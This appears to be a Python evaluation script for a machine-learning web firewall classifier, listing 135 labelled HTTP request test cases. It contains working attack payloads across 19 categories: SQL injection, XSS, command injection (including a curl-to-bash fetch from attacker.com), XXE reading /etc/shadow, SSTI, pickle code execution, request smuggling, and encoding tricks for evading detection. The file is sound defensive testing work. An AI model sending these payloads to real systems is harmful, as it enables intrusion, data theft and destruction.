import argparse
import json
import os
import statistics
import sys
from collections import Counter, defaultdict
from datetime import datetime, timezone

# ── Inference core ─────────────────────────────────────────────
# The V4 runtime pipeline — decision contract, prompt, model loading,
# generation and parsing — lives in inference_core.py and is shared with the
# FastAPI control plane, so evaluation and runtime cannot drift apart (#15).
from inference_core import (
    DEFAULT_ADAPTER_DIR as ADAPTER_DIR,
    classify_raw,
    load_model,
    normalize_reason,
    parse_prediction,
    resolve_device,
)

# ── Test cases: (request, expected_label, category, description) ──
# SYSTEMATIC: 5 cases per category × 19 categories = 95 BLOCK
SYSTEMATIC_CASES = [

    # ── 1. SQL Injection ──────────────────────────────────────────
    (
        "GET /api/users?id=1' OR '1'='1 HTTP/1.1\nHost: target.com",
        "BLOCK", "SQL Injection", "Classic OR bypass",
    ),
    (
        "GET /login?user=admin'-- HTTP/1.1\nHost: target.com",
        "BLOCK", "SQL Injection", "Comment-based auth bypass",
    ),
    (
        "POST /search HTTP/1.1\nHost: target.com\nContent-Type: application/x-www-form-urlencoded\n\nq=1; DROP TABLE users--",
        "BLOCK", "SQL Injection", "DROP TABLE via POST body",
    ),
    (
        "GET /products?category=shoes' UNION SELECT username,password,3 FROM users-- HTTP/1.1\nHost: target.com",
        "BLOCK", "SQL Injection", "UNION-based data extraction",
    ),
    (
        "GET /api/item?id=1' AND SLEEP(5)-- HTTP/1.1\nHost: target.com",
        "BLOCK", "SQL Injection", "Time-based blind injection",
    ),

    # ── 2. XSS Injection ──────────────────────────────────────────
    (
        "GET /search?q=<script>alert('xss')</script> HTTP/1.1\nHost: target.com",
        "BLOCK", "XSS Injection", "Basic script tag",
    ),
    (
        "GET /profile?name=<img src=x onerror=alert(document.cookie)> HTTP/1.1\nHost: target.com",
        "BLOCK", "XSS Injection", "img onerror payload",
    ),
    (
        "GET /redirect?url=javascript:alert(1) HTTP/1.1\nHost: target.com",
        "BLOCK", "XSS Injection", "javascript: URI scheme",
    ),
    (
        "POST /comment HTTP/1.1\nHost: target.com\nContent-Type: application/x-www-form-urlencoded\n\nbody=\"><svg onload=alert(1)>",
        "BLOCK", "XSS Injection", "SVG onload injection",
    ),
    (
        "GET /page?title=<iframe src=\"javascript:alert('xss')\"></iframe> HTTP/1.1\nHost: target.com",
        "BLOCK", "XSS Injection", "iframe javascript src",
    ),

    # ── 3. Command Injection ──────────────────────────────────────
    (
        "GET /api/ping?host=127.0.0.1;cat /etc/passwd HTTP/1.1\nHost: target.com",
        "BLOCK", "Command Injection", "Semicolon chaining",
    ),
    (
        "GET /api/lookup?domain=example.com|whoami HTTP/1.1\nHost: target.com",
        "BLOCK", "Command Injection", "Pipe operator",
    ),
    (
        "GET /api/exec?cmd=`id` HTTP/1.1\nHost: target.com",
        "BLOCK", "Command Injection", "Backtick subshell",
    ),
    (
        "POST /api/convert HTTP/1.1\nHost: target.com\nContent-Type: application/x-www-form-urlencoded\n\nfile=test.jpg;$(curl http://attacker.com/shell.sh|bash)",
        "BLOCK", "Command Injection", "Curl-based RCE",
    ),
    (
        "GET /api/resize?width=100&height=100;rm -rf /tmp/* HTTP/1.1\nHost: target.com",
        "BLOCK", "Command Injection", "Destructive rm -rf",
    ),

    # ── 4. LDAP Injection ────────────────────────────────────────
    (
        "GET /api/user?username=*)(uid=*))(|(uid=* HTTP/1.1\nHost: target.com",
        "BLOCK", "LDAP Injection", "LDAP filter escape",
    ),
    (
        "POST /login HTTP/1.1\nHost: target.com\nContent-Type: application/x-www-form-urlencoded\n\nusername=admin)(&)&password=anything",
        "BLOCK", "LDAP Injection", "Auth bypass with (&)",
    ),
    (
        "GET /directory?search=*)(objectClass=*) HTTP/1.1\nHost: target.com",
        "BLOCK", "LDAP Injection", "objectClass wildcard",
    ),
    (
        "GET /users?cn=*)(|(cn=admin)(cn=root HTTP/1.1\nHost: target.com",
        "BLOCK", "LDAP Injection", "OR-chained CN filter",
    ),
    (
        "POST /search HTTP/1.1\nHost: target.com\nContent-Type: application/x-www-form-urlencoded\n\nquery=\\2a)(uid=administrator)(|(uid=\\2a",
        "BLOCK", "LDAP Injection", "Hex-encoded wildcard",
    ),

    # ── 5. XXE Injection ─────────────────────────────────────────
    (
        "POST /api/xml HTTP/1.1\nHost: target.com\nContent-Type: application/xml\n\n<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>",
        "BLOCK", "XXE Injection", "Classic file:/// entity",
    ),
    (
        "POST /upload HTTP/1.1\nHost: target.com\nContent-Type: application/xml\n\n<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY xxe SYSTEM \"http://attacker.com/evil.dtd\">]><data>&xxe;</data>",
        "BLOCK", "XXE Injection", "Remote DTD exfil",
    ),
    (
        "POST /parse HTTP/1.1\nHost: target.com\nContent-Type: text/xml\n\n<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">%xxe;]><foo/>",
        "BLOCK", "XXE Injection", "XXE + SSRF to IMDS",
    ),
    (
        "POST /import HTTP/1.1\nHost: target.com\nContent-Type: application/xml\n\n<?xml version=\"1.0\" encoding=\"utf-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/shadow\">]><order><id>&xxe;</id></order>",
        "BLOCK", "XXE Injection", "etc/shadow exfil",
    ),
    (
        "POST /invoice HTTP/1.1\nHost: target.com\nContent-Type: application/xml\n\n<?xml version=\"1.0\"?><!DOCTYPE lolz [<!ENTITY lol \"lol\"><!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;\">]><root>&lol2;</root>",
        "BLOCK", "XXE Injection", "Billion laughs DoS",
    ),

    # ── 6. Open Redirect ─────────────────────────────────────────
    (
        "GET /logout?redirect=http://evil.com/phishing HTTP/1.1\nHost: target.com",
        "BLOCK", "Open Redirect", "Absolute URL redirect",
    ),
    (
        "GET /auth/callback?next=//evil.com HTTP/1.1\nHost: target.com",
        "BLOCK", "Open Redirect", "Protocol-relative URL",
    ),
    (
        "GET /sso?return_to=javascript:alert(document.cookie) HTTP/1.1\nHost: target.com",
        "BLOCK", "Open Redirect", "javascript: scheme in redirect",
    ),
    (
        "GET /track?url=http://target.com%2F@evil.com/steal HTTP/1.1\nHost: target.com",
        "BLOCK", "Open Redirect", "URL confusion with @",
    ),
    (
        "GET /go?goto=//evil.com/%2F.. HTTP/1.1\nHost: target.com",
        "BLOCK", "Open Redirect", "Path traversal in redirect",
    ),

    # ── 7. SSRF ──────────────────────────────────────────────────
    (
        "GET /api/fetch?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1\nHost: target.com",
        "BLOCK", "SSRF", "AWS IMDS endpoint",
    ),
    (
        "POST /api/proxy HTTP/1.1\nHost: target.com\nContent-Type: application/x-www-form-urlencoded\n\nurl=http://internal.corp.local/admin",
        "BLOCK", "SSRF", "Internal network access",
    ),
    (
        "GET /webhook?endpoint=http://localhost:6379/ HTTP/1.1\nHost: target.com",
        "BLOCK", "SSRF", "Redis localhost probe",
    ),
    (
        "POST /screenshot HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"url\":\"file:///etc/passwd\"}",
        "BLOCK", "SSRF", "file:// scheme via JSON",
    ),
    (
        "GET /api/resolve?host=http://0.0.0.0:22/ HTTP/1.1\nHost: target.com",
        "BLOCK", "SSRF", "0.0.0.0 SSH probe",
    ),

    # ── 8. JWT Attacks ───────────────────────────────────────────
    (
        "GET /api/admin HTTP/1.1\nHost: target.com\nAuthorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.",
        "BLOCK", "JWT Attacks", "alg:none unsigned token",
    ),
    (
        "GET /api/profile HTTP/1.1\nHost: target.com\nAuthorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoic3VwZXJhZG1pbiIsImV4cCI6OTk5OTk5OTk5OX0.forged_signature",
        "BLOCK", "JWT Attacks", "Forged HMAC signature",
    ),
    (
        "GET /api/settings HTTP/1.1\nHost: target.com\nAuthorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4iLCJleHAiOjB9.invalid",
        "BLOCK", "JWT Attacks", "Expired token exp=0",
    ),
    (
        "GET /api/data HTTP/1.1\nHost: target.com\nAuthorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6Ii4uLy4uLy4uL2Rldi9udWxsIn0.eyJ1c2VyIjoiYWRtaW4ifQ.sig",
        "BLOCK", "JWT Attacks", "kid path traversal ../../../dev/null",
    ),
    (
        "GET /api/export HTTP/1.1\nHost: target.com\nAuthorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4iLCJpYXQiOjE1MTYyMzkwMjIsImV4cCI6OTk5OTk5OTk5OSwianRpIjoiLi4vLi4vLi4vZXRjL3Bhc3N3ZCJ9.x",
        "BLOCK", "JWT Attacks", "JWT jti path injection",
    ),

    # ── 9. GraphQL Injection ─────────────────────────────────────
    (
        "POST /graphql HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"query\":\"{ __schema { types { name fields { name } } } }\"}",
        "BLOCK", "GraphQL Injection", "__schema introspection",
    ),
    (
        "POST /graphql HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"query\":\"{ user(id: \\\"1 UNION SELECT username,password FROM users--\\\") { id name } }\"}",
        "BLOCK", "GraphQL Injection", "SQL injection inside GQL arg",
    ),
    (
        "POST /graphql HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"query\":\"{ a:__typename b:__typename c:__typename d:__typename e:__typename f:__typename g:__typename h:__typename }\"}",
        "BLOCK", "GraphQL Injection", "Batched alias DoS query",
    ),
    (
        "POST /graphql HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"query\":\"mutation { updateUser(id: 1, role: \\\"admin\\\") { id role } }\"}",
        "BLOCK", "GraphQL Injection", "Privilege escalation mutation",
    ),
    (
        "POST /graphql HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n[{\"query\":\"{ user(id:1){name} }\"},{\"query\":\"{ user(id:2){name} }\"},{\"query\":\"{ user(id:3){name} }\"}]",
        "BLOCK", "GraphQL Injection", "Batch query array abuse",
    ),

    # ── 10. NoSQL Injection ──────────────────────────────────────
    (
        "POST /api/login HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"username\":{\"$gt\":\"\"},\"password\":{\"$gt\":\"\"}}",
        "BLOCK", "NoSQL Injection", "MongoDB $gt auth bypass",
    ),
    (
        "GET /api/users?filter={\"$where\":\"this.role=='admin'\"} HTTP/1.1\nHost: target.com",
        "BLOCK", "NoSQL Injection", "$where JS execution",
    ),
    (
        "GET /api/search?name[$regex]=.* HTTP/1.1\nHost: target.com",
        "BLOCK", "NoSQL Injection", "$regex wildcard dump",
    ),
    (
        "POST /api/find HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}}",
        "BLOCK", "NoSQL Injection", "$ne null bypass",
    ),
    (
        "POST /api/auth HTTP/1.1\nHost: target.com\nContent-Type: application/json\n\n{\"username\":\"admin\",\"password\":{\"$or\":[{\"role\":\"admin\"},{\"active\":true}]}}",
        "BLOCK", "NoSQL Injection", "$or operator injection",
    ),

    # ── 11. SSTI ─────────────────────────────────────────────────
    (
        "GET /greet?name={{7*7}} HTTP/1.1\nHost: target.com",
        "BLOCK", "SSTI", "Jinja2 arithmetic probe",
    ),
    (
        "POST /render HTTP/1.1\nHost: target.com\nContent-Type: application/x-www-form-urlencoded\n\ntemplate={{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
        "BLOCK", "SSTI", "Python globals RCE",
    ),
    (
        "GET /hello?msg=${7*7} HTTP/1.1\nHost: target.com",
        "BLOCK", "SSTI", "FreeMarker/Velocity ${} probe",
    ),
    (
        "GET /page?title=<%= 7*7 %> HTTP/1.1\nHost: target.com",
        "BLOCK", "SSTI", "ERB template probe",
    ),
    (
        "GET /view?tpl={{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}} HTTP/1.1\nHost: target.com",
        "BLOCK", "SSTI", "Jinja2 subprocess RCE",
    ),

    # ── 12. File Inclusion ────────────────────────────────────────
    (
        "GET /index.php?lang=../../../../etc/passwd HTTP/1.1\nHost: target.com",
        "BLOCK", "File Inclusion", "LFI path traversal",
    ),
    (
        "GET /page.php?file=php://filter/convert.base64-encode/resource=config HTTP/1.1\nHost: target.com",
        "BLOCK", "File Inclusion", "PHP filter wrapper",
    ),
    (
        "GET /include.php?page=http://evil.com/shell.php HTTP/1.1\nHost: target.com",
        "BLOCK", "File Inclusion", "Remote file inclusion",
    ),
    (
        "GET /view.php?template=data://text/plain,<?php system('id')?> HTTP/1.1\nHost: target.com",
        "BLOCK", "File Inclusion", "data:// wrapper RCE",
    ),
    (
        "GET /load.php?module=expect://id HTTP/1.1\nHost: target.com",
        "BLOCK", "File Inclusion", "expect:// wrapper RCE",
    ),

    # ── 13. Insecure Deserialization ─────────────────────────────
    (
        "POST /api/session HTTP/1.1\nHost: target.com\nContent-Type: application/x-java-serialized-object\n\nrO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZQ==",
        "BLOCK", "Insecure Deserialization", "Java serialized object",
    ),
    (
        "POST /api/data HTTP/1.1\nHost: target.com\nContent-Type: application/octet-stream\n\nO:8:\"stdClass\":1:{s:4:\"exec\";s:9:\"id>/tmp/x\";}",
        "BLOCK", "Insecure Deserialization", "PHP object injection",
    ),
    (
        "POST /api/restore HTTP/1.1\nHost: target.com\nContent-Type: application/octet-stream\n\n80 04 95 1e 00 00 00 00 00 00 00 8c 02 6f 73 94 8c 06 73 79 73 74 65 6d 94 93 94 8c 02 69 64 94 85 94 52 94 2e",
        "BLOCK", "Insecure Deserialization", "Python pickle RCE",
    ),
    (
        "POST /api/config HTTP/1.1\nHost: target.com\nContent-Type: application/yaml\n\n!!python/object/apply:os.system ['id']",
        "BLOCK", "Insecure Deserialization", "YAML python object",
    ),
    (
        "POST /viewstate HTTP/1.1\nHost: target.com\nContent-Type: application/x-www-form-urlencoded\n\n__VIEWSTATE=%2FwEPDwUKLTM2NTIzNDA3OA9kFgICAw8WAh4HZW5jcnlwdA%2FvAI%2BBp9HLiYX0qXL78VHXtCX1NA%3D%3D",
        "BLOCK", "Insecure Deserialization", ".NET ViewState gadget",
    ),

    # ── 14. HTTP Request Smuggling ────────────────────────────────
    (
        "POST /api/data HTTP/1.1\nHost: target.com\nContent-Length: 6\nTransfer-Encoding: chunked\n\n0\r\n\r\nGET /admin HTTP/1.1\nHost: target.com",
        "BLOCK", "HTTP Request Smuggling", "CL.TE conflict",
    ),
    (
        "POST / HTTP/1.1\nHost: target.com\nContent-Length: 44\nTransfer-Encoding: chunked\n\nb\r\nsmuggled=yes\r\n0\r\n\r\nGET /internal HTTP/1.1",
        "BLOCK", "HTTP Request Smuggling", "TE.CL split request",
    ),
    (
        "POST /search HTTP/1.1\nHost: target.com\nContent-Length: 49\nTransfer-Encoding: chunked\nTransfer-Encoding: identity\n\ne\r\nq=smuggling+test\r\n0\r\n\r\n",
        "BLOCK", "HTTP Request Smuggling", "TE.TE obfuscated header",
    ),
    (
        "POST /update HTTP/1.1\nHost: target.com\nTransfer-Encoding: xchunked\nContent-Length: 4\n\n1\r\nZ\r\n0\r\n\r\n",
        "BLOCK", "HTTP Request Smuggling", "xchunked TE variant",
    ),
    (
        "POST /submit HTTP/1.1\nHost: target.com\nContent-Length: 30\nTransfer-Encoding:\tchunked\n\n0\r\n\r\nPOST /poison HTTP/1.1\r\n",
        "BLOCK", "HTTP Request Smuggling", "Tab-obfuscated TE header",
    ),

    # ── 15. CRLF Injection ───────────────────────────────────────
    (
        "GET /redirect?url=https://example.com%0d%0aSet-Cookie:%20session=hijacked HTTP/1.1\nHost: target.com",
        "BLOCK", "CRLF Injection", "Cookie injection via %0d%0a",
    ),
    (
        "GET /log?msg=hello%0aContent-Length:%200%0a%0aHTTP/1.1%20200%20OK HTTP/1.1\nHost: target.com",
        "BLOCK", "CRLF Injection", "Response splitting",
    ),
    (
        "GET /page?name=test%0d%0aLocation:%20http://evil.com HTTP/1.1\nHost: target.com",
        "BLOCK", "CRLF Injection", "Location header injection",
    ),
    (
        "GET /search?q=normal%0d%0aX-Injected-Header:%20malicious HTTP/1.1\nHost: target.com",
        "BLOCK", "CRLF Injection", "Custom header injection",
    ),
    (
        "POST /contact HTTP/1.1\nHost: target.com\nContent-Type: application/x-www-form-urlencoded\n\nname=attacker%0d%0aBcc%3A%20victim%40evil.com&message=hello",
        "BLOCK", "CRLF Injection", "Email header injection",
    ),

    # ── 16. HTTP Parameter Pollution ─────────────────────────────
    (
        "GET /search?id=1&id=2&id=99999 HTTP/1.1\nHost: target.com",
        "BLOCK", "HTTP Parameter Pollution", "Duplicate id params",
    ),
    (
        "GET /api/user?role=user&role=admin HTTP/1.1\nHost: target.com",
        "BLOCK", "HTTP Parameter Pollution", "Role escalation via duplicate",
    ),
    (
        "POST /transfer HTTP/1.1\nHost: target.com\nContent-Type: application/x-www-form-urlencoded\n\namount=100&to=alice&to=attacker&amount=99999",
        "BLOCK", "HTTP Parameter Pollution", "Payment redirect via HPP",
    ),
    (
        "GET /filter?status=active&status=inactive&status=all HTTP/1.1\nHost: target.com",
        "BLOCK", "HTTP Parameter Pollution", "Filter bypass via repetition",
    ),
    (
        "GET /api/access?token=legit&token=&token=admin HTTP/1.1\nHost: target.com",
        "BLOCK", "HTTP Parameter Pollution", "Token pollution with empty value",
    ),

    # ── 17. XPath Injection ──────────────────────────────────────
    (
        "POST /xml HTTP/1.1\nHost: target.com\nContent-Type: application/xml\n\n<user><name>' or '1'='1</name></user>",
        "BLOCK", "XPath Injection", "Classic XPath OR bypass",
    ),
    (
        "GET /api/lookup?user=admin' or 1=1 or 'a'='a HTTP/1.1\nHost: target.com",
        "BLOCK", "XPath Injection", "XPath tautology",
    ),
    (
        "POST /search HTTP/1.1\nHost: target.com\nContent-Type: application/x-www-form-urlencoded\n\nquery='] | //* | //*['",
        "BLOCK", "XPath Injection", "Union-based node dump",
    ),
    (
        "GET /directory?cn=test') or ('1'='1 HTTP/1.1\nHost: target.com",
        "BLOCK", "XPath Injection", "Parenthesis escape",
    ),
    (
        "POST /authenticate HTTP/1.1\nHost: target.com\nContent-Type: application/x-www-form-urlencoded\n\nusername=admin&password=' or substring(password,1,1)='a",
        "BLOCK", "XPath Injection", "Blind XPath substring extraction",
    ),

    # ── 18. Path Traversal ───────────────────────────────────────
    (
        "GET /files?path=../../etc/passwd HTTP/1.1\nHost: target.com",
        "BLOCK", "Path Traversal", "Basic ../ traversal",
    ),
    (
        "GET /download?file=..%2F..%2Fetc%2Fpasswd HTTP/1.1\nHost: target.com",
        "BLOCK", "Path Traversal", "URL-encoded ../ traversal",
    ),
    (
        "GET /static/....//....//etc/passwd HTTP/1.1\nHost: target.com",
        "BLOCK", "Path Traversal", "Double-dot slash bypass",
    ),
    (
        "GET /assets/%2e%2e%2f%2e%2e%2fetc%2fpasswd HTTP/1.1\nHost: target.com",
        "BLOCK", "Path Traversal", "Fully encoded traversal",
    ),
    (
        "GET /upload?dest=..\\..\\windows\\system32\\config\\sam HTTP/1.1\nHost: target.com",
        "BLOCK", "Path Traversal", "Windows backslash traversal",
    ),

    # ── 19. CSRF ─────────────────────────────────────────────────
    (
        "POST /api/transfer HTTP/1.1\nHost: bank.com\nContent-Type: application/x-www-form-urlencoded\nOrigin: http://evil.com\nReferer: http://evil.com/attack.html\n\namount=10000&to=attacker",
        "BLOCK", "CSRF", "Forged cross-origin transfer",
    ),
    (
        "POST /api/change-email HTTP/1.1\nHost: app.com\nContent-Type: application/x-www-form-urlencoded\nOrigin: https://evil.com\n\nemail=attacker%40evil.com",
        "BLOCK", "CSRF", "Email change from cross-origin",
    ),
    (
        "POST /admin/delete-user HTTP/1.1\nHost: target.com\nReferer: https://attacker.com/csrf.html\nContent-Type: application/x-www-form-urlencoded\n\nuser_id=42",
        "BLOCK", "CSRF", "Admin action with attacker referer",
    ),
    (
        "POST /api/password-reset HTTP/1.1\nHost: target.com\nOrigin: null\nContent-Type: application/x-www-form-urlencoded\n\nnew_password=hacked123",
        "BLOCK", "CSRF", "Null origin CSRF bypass",
    ),
    (
        "POST /settings/update HTTP/1.1\nHost: target.com\nContent-Type: application/x-www-form-urlencoded\nOrigin: http://evil.com\n\nnotification_email=attacker%40evil.com&csrf_token=",
        "BLOCK", "CSRF", "Empty CSRF token bypass",
    ),
]

# ── Adversarial cases: 20 cases ───────────────────────────────────
# (request, expected, category, description)
ADVERSARIAL_CASES = [
    # URL-encoded payloads
    (
        "GET /search?q=%27%20OR%20%271%27%3D%271 HTTP/1.1\nHost: target.com",
        "BLOCK", "Adversarial", "SQL injection URL-encoded (' OR '1'='1)",
    ),
    (
        "GET /page?name=%3Cscript%3Ealert(1)%3C%2Fscript%3E HTTP/1.1\nHost: target.com",
        "BLOCK", "Adversarial", "XSS URL-encoded (<script>)",
    ),
    (
        "GET /files?path=..%2F..%2Fetc%2Fpasswd HTTP/1.1\nHost: target.com",
        "BLOCK", "Adversarial", "Path traversal URL-encoded",
    ),
    # Double-encoded payloads
    (
        "GET /search?q=%2527%2520OR%25201%253D1 HTTP/1.1\nHost: target.com",
        "BLOCK", "Adversarial", "SQL injection double-encoded",
    ),
    (
        "GET /view?x=%253Cscript%253Ealert(1)%253C/script%253E HTTP/1.1\nHost: target.com",
        "BLOCK", "Adversarial", "XSS double-encoded",
    ),
    # Mixed case bypasses
    (
        "GET /api/users?id=1' oR '1'='1 HTTP/1.1\nHost: target.com",
        "BLOCK", "Adversarial", "SQL mixed-case OR",
    ),
    (
        "GET /products?q=1' uNiOn SeLeCt username,password FROM users-- HTTP/1.1\nHost: target.com",
        "BLOCK", "Adversarial", "SQL UNION mixed case",
    ),
    (
        "GET /search?q=<ScRiPt>aLeRt(1)</sCrIpT> HTTP/1.1\nHost: target.com",
        "BLOCK", "Adversarial", "XSS mixed case tag",
    ),
    # Comment-based split
    (
        "GET /api/items?id=1/**/UNION/**/SELECT/**/password/**/FROM/**/users-- HTTP/1.1\nHost: target.com",
        "BLOCK", "Adversarial", "SQL UNION with comment separators",
    ),
    (
        "GET /search?a=1'%20UN&b=ION%20SELECT%20password%20FROM%20users-- HTTP/1.1\nHost: target.com",
        "BLOCK", "Adversarial", "SQL payload split across params",
    ),
    # IFS and bash evasion
    (
        "GET /api/ping?host=127.0.0.1|$(cat${IFS}/etc/passwd) HTTP/1.1\nHost: target.com",
        "BLOCK", "Adversarial", "Command injection IFS evasion",
    ),
    (
        "GET /api/ping?host=127.0.0.1;$(whoami) HTTP/1.1\nHost: target.com",
        "BLOCK", "Adversarial", "Command injection bash substitution",
    ),
    # Unicode escape
    (
        "GET /search?q=\\u003cscript\\u003ealert(1)\\u003c/script\\u003e HTTP/1.1\nHost: target.com",
        "BLOCK", "Adversarial", "XSS unicode-escaped tags",
    ),
    # Python SSTI advanced
    (
        "GET /api/user?input={{''.__class__.__mro__[1].__subclasses__()}} HTTP/1.1\nHost: target.com",
        "BLOCK", "Adversarial", "SSTI MRO subclasses probe",
    ),
    # False positive traps (ALLOW)
    (
        "GET /ui/dropdown?action=drop&item=table HTTP/1.1\nHost: app.com",
        "ALLOW", "Adversarial", "Legit UI action with 'drop table' keywords",
    ),
    (
        "GET /blog/post?title=how-to-union-workers-rights HTTP/1.1\nHost: blog.example.com",
        "ALLOW", "Adversarial", "Legit blog URL with 'union'",
    ),
    (
        "GET /api/search?q=select+your+plan HTTP/1.1\nHost: app.com",
        "ALLOW", "Adversarial", "Legit search with 'select'",
    ),
    (
        "POST /api/users HTTP/1.1\nHost: app.com\nContent-Type: application/json\n\n{\"role\":\"admin\",\"active\":true,\"username\":\"bob\"}",
        "ALLOW", "Adversarial", "Legit admin API call with role field",
    ),
    # CSIC-style traffic (Konqueror UA + JSESSIONID — model may over-fit)
    (
        "GET /publico/carrito.jsp HTTP/1.1\nHost: target.com\nUser-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)\nCookie: JSESSIONID=45F75956E77588BAF95AAA39C1B01CE7",
        "ALLOW", "Adversarial", "CSIC-style legit request (Konqueror UA)",
    ),
    (
        "GET /publico/vaciar.jsp?B2=Vaciar+carrito HTTP/1.1\nHost: target.com\nUser-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)\nCookie: JSESSIONID=0C548E66939A099DBFEAAA9656B7E1FA",
        "ALLOW", "Adversarial", "CSIC cart-clear legit request",
    ),
]

# ── False positive stress test: 20 ALLOW cases ────────────────────
FALSE_POSITIVE_CASES = [
    (
        "GET /api/products?category=electronics&page=1&sort=price_asc HTTP/1.1\nHost: shop.com",
        "ALLOW", "False Positive", "Standard e-commerce listing",
    ),
    (
        "POST /api/login HTTP/1.1\nHost: app.com\nContent-Type: application/json\n\n{\"username\":\"alice\",\"password\":\"P@ssw0rd!\"}",
        "ALLOW", "False Positive", "Normal login with special chars in password",
    ),
    (
        "GET /index.html HTTP/1.1\nHost: example.com",
        "ALLOW", "False Positive", "Simple homepage request",
    ),
    (
        "GET /api/status HTTP/1.1\nHost: monitor.example.com",
        "ALLOW", "False Positive", "Health check endpoint",
    ),
    (
        "GET /api/me HTTP/1.1\nHost: api.example.com\nAuthorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXzEyMyIsIm5hbWUiOiJBbGljZSBTbWl0aCIsImlhdCI6MTcxNjIzOTAyMiwiZXhwIjoxNzE2MjQyNjIyfQ.validSignature",
        "ALLOW", "False Positive", "Valid JWT bearer token",
    ),
    (
        "GET /search?q=how+to+select+a+good+password&lang=en HTTP/1.1\nHost: docs.example.com",
        "ALLOW", "False Positive", "Search query with benign 'select'",
    ),
    (
        "POST /api/feedback HTTP/1.1\nHost: app.com\nContent-Type: application/json\n\n{\"message\":\"The <b>best</b> product & service I've ever used!\"}",
        "ALLOW", "False Positive", "User content with HTML entities",
    ),
    (
        "GET /users/42/profile HTTP/1.1\nHost: api.example.com",
        "ALLOW", "False Positive", "REST endpoint with numeric ID",
    ),
    (
        "POST /graphql HTTP/1.1\nHost: api.example.com\nContent-Type: application/json\n\n{\"query\":\"{ currentUser { id name email } }\"}",
        "ALLOW", "False Positive", "Benign GraphQL user query",
    ),
    (
        "GET /api/reports?filter=active&sort=desc&limit=100 HTTP/1.1\nHost: app.example.com",
        "ALLOW", "False Positive", "API filter params",
    ),
    (
        "POST /api/password-reset HTTP/1.1\nHost: app.com\nContent-Type: application/json\n\n{\"email\":\"alice@example.com\"}",
        "ALLOW", "False Positive", "Password reset by email",
    ),
    (
        "GET /files/report_2024-01-15.pdf HTTP/1.1\nHost: docs.example.com",
        "ALLOW", "False Positive", "File download with dots in filename",
    ),
    (
        "POST /webhook HTTP/1.1\nHost: app.com\nContent-Type: application/json\nX-Hub-Signature: sha256=abc123\n\n{\"event\":\"push\",\"payload\":\"dGVzdA==\"}",
        "ALLOW", "False Positive", "Webhook with base64 payload",
    ),
    (
        "GET /api/products/search?q=select+blue+jeans&size=32&color=blue HTTP/1.1\nHost: shop.com",
        "ALLOW", "False Positive", "Shopping search with 'select' keyword",
    ),
    (
        "POST /api/orders HTTP/1.1\nHost: shop.com\nContent-Type: application/json\n\n{\"items\":[{\"id\":1,\"qty\":2},{\"id\":5,\"qty\":1}],\"coupon\":\"SAVE10\"}",
        "ALLOW", "False Positive", "Order submission with coupon code",
    ),
    (
        "GET /api/analytics?from=2024-01-01&to=2024-12-31&group_by=day HTTP/1.1\nHost: dashboard.example.com\nAuthorization: Bearer validtoken123",
        "ALLOW", "False Positive", "Analytics date range query",
    ),
    (
        "PUT /api/users/99/settings HTTP/1.1\nHost: app.com\nContent-Type: application/json\n\n{\"theme\":\"dark\",\"language\":\"en\",\"notifications\":true}",
        "ALLOW", "False Positive", "User settings update",
    ),
    (
        "GET /cdn/assets/app.min.js?v=2.3.1 HTTP/1.1\nHost: cdn.example.com",
        "ALLOW", "False Positive", "CDN asset request with version",
    ),
    (
        "POST /api/contact HTTP/1.1\nHost: company.com\nContent-Type: application/json\n\n{\"name\":\"Bob & Alice\",\"email\":\"bob@example.com\",\"subject\":\"Question about <Enterprise> plan\"}",
        "ALLOW", "False Positive", "Contact form with angle brackets and ampersand",
    ),
    (
        "GET /api/items?ids=1,2,3,4,5&fields=id,name,price HTTP/1.1\nHost: api.example.com",
        "ALLOW", "False Positive", "Multi-ID batch fetch with field selection",
    ),
]

# ── Combined suite ────────────────────────────────────────────────
ALL_CASES = SYSTEMATIC_CASES + ADVERSARIAL_CASES + FALSE_POSITIVE_CASES

# ══════════════════════════════════════════════════════════════════════════
# E5 — FROZEN EVALUATION METHODOLOGY
#
# Everything below implements the methodology frozen in
# reports/e5_evaluation_methodology.txt BEFORE the first V4 training run.
#
# THREE SEPARATE LEVELS. They are never combined into one headline number.
#   LEVEL 1  binary security decision   (ALLOW vs BLOCK)
#   LEVEL 2  attack category / reason   (only over correctly-blocked attacks)
#   LEVEL 3  latency distribution       (model-side inference only)
#
# PRIMARY SOURCE  datasets/v4_clean/eval.jsonl — the held-out, leakage-free
#                 split from E2/E3.
# LEGACY SUITE    the 135 hand-authored cases above are a MANUAL DIAGNOSTIC /
#                 REGRESSION suite. They are NOT the primary metric.
